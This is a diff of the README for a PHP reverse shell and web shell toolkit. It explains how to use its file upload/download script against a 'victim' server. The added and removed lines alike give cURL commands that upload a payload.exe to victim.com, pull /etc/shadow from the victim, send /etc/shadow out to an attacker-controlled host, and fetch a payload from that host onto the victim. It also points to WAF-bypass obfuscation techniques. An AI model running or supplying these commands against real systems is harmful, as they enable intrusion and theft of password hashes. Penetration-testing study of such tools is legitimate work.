@@ -2,9 +2,9 @@
 
 Just a little refresh on the popular PHP reverse shell script [pentestmonkey/php-reverse-shell](https://github.com/pentestmonkey/php-reverse-shell). Credits to the original author!
 
-Works on Linux OS and macOS with `/bin/sh` and Windows OS with `cmd.exe`. Script will automatically detect an underlying OS.
+Works on Linux OS and macOS with `/bin/sh` and Windows OS with `cmd.exe`. Script will automatically detect the underlying OS.
 
-Works with both `ncat` and `multi/handler`.
+Works with both, `ncat` and `multi/handler`.
 
 Tested on XAMPP for Linux v7.3.19 (64-bit) with PHP v7.3.19 on Kali Linux v2020.2 (64-bit).
 
@@ -30,7 +30,7 @@ Made for educational purposes. I hope it will help!
 
 ## Reverse Shells
 
-[/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) requires PHP v5.0.0 or greater, mainly because `proc_get_status()` is used.
+[/src/reverse/php_reverse_shell.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell.php) requires PHP v5.0.0 or greater.
 
 [/src/reverse/php_reverse_shell_older.php](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/reverse/php_reverse_shell_older.php) requires PHP v4.3.0 or greater.
 
@@ -48,50 +48,52 @@ Check the [simple PHP web shell](https://github.com/ivan-sincek/php-reverse-shel
 
 Check the [simple PHP web shell v2](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/simple_php_web_shell_get_v2.php) based on HTTP GET request. You must [URL encode](https://www.urlencoder.org) your commands.
 
-Find out more about PHP obfuscation techniques for older versions of PHP at [lcatro/PHP-WebShell-Bypass-WAF](https://github.com/lcatro/PHP-WebShell-Bypass-WAF). Credits to the author!
+Find out more about PHP obfuscation techniques for old versions of PHP at [lcatro/PHP-WebShell-Bypass-WAF](https://github.com/lcatro/PHP-WebShell-Bypass-WAF). Credits to the author!
 
 ## File Upload/Download Script
 
 Check the [simple PHP file upload/download script](https://github.com/ivan-sincek/php-reverse-shell/blob/master/src/web/files.php) based on HTTP POST request for file upload and HTTP GET request for file download.
 
-When downloading a file, you should [URL encode](https://www.urlencoder.org) the file path, and specify name of the output file.
+When downloading a file, you must [URL encode](https://www.urlencoder.org) the file path, and don't forget to specify the output file if using cURL.
 
-Depending on the server configuration, downloading a file through HTTP GET parameter might not always work, so you will have to hardcore the file path in the script.
+When uploading a file, and don't forget to specify `@` before the file path.
+
+Depending on the server configuration, downloading a file through HTTP GET request parameter might not always work, instead, you will have to hardcore the file path in the script.
 
 ### Case 1: Upload the Script to the Victim’s Server
 
-Navigate to the script on the victim's server with your preferred web browser, or use cURL from you PC.
+Navigate to the script on the victim's web server with your preferred web browser, or use cURL from you PC.
 
-Upload a file to the victim's server web root directory from your PC:
-
-```fundamental
-curl -s -k -X POST https://victim.com/files.php -F file=@/root/payload.exe
-```
-
-Download a file from the victim's PC to your PC:
+Upload a file to the server's web root directory from your PC:
 
 ```fundamental
-curl -s -k -X GET https://victim.com/files.php?file=/etc/shadow -o shadow
+curl -skL -X POST https://victim.com/files.php -F file=@/root/payload.exe
 ```
 
-If you use reverse shell and you have elevated your initial privileges, this script might not have the same privileges as your shell. To download a certain file, you might need to copy the file to the web root directory and give it necessary read permissions.
+Download a file from the server to your PC:
+
+```fundamental
+curl -skL -X GET https://victim.com/files.php?file=/etc/shadow -o shadow
+```
+
+If you elevated your initial privileges within your reverse shell, this script might not have the same privileges as the shell. In that case, to download a certain file, you might need to copy the file to the web root directory and set the necessary read permissions.
 
 ### Case 2: Upload the Script to Your Server
 
 From your PHP reverse shell, run the following cURL commands.
 
-Upload a file from the victim's PC to your server web root directory:
+Upload a file from the victim's PC to your server's web root directory:
 
 ```fundamental
-curl -s -k -X POST https://your-server.com/files.php -F file=@/etc/shadow
+curl -skL -X POST https://my-server.com/files.php -F file=@/etc/shadow
 ```
 
-Download a file from your PC to the victim's PC:
+Download a file from your server's web root directory to the victim's PC:
 
 ```fundamental
-curl -s -k -X GET https://your-server.com/files.php?file=/root/payload.exe -o payload.exe
+curl -skL -X GET https://my-server.com/files.php?file=/root/payload.exe -o payload.exe
 
-curl -s -k -X GET https://your-server.com/payload.exe -o payload.exe
+curl -skL -X GET https://my-server.com/payload.exe -o payload.exe
 ```
 
 ## Set Up a Listener
